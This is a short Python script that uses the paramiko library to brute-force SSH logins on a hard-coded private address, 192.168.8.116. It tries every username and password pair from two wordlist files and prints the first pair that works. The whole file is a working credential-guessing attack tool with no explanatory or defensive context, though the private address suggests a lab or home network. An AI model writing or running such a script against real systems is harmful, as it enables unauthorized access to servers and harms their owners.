
import paramiko
import time

target_ip = "192.168.8.116"
usernames = open("user.txt").read().splitlines()
passwords = open("password.txt").read().splitlines()

for username in usernames:
    for password in passwords:
        try:
            print(f"Trying {username}:{password}")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=username, password=password, timeout=3)
            time.sleep(0.8)
            print(f"[+] SUCCESS: {username}:{password}")
            client.close()
            exit()
        except Exception as e:
        	print(f"Exception: {e}")
        	continue
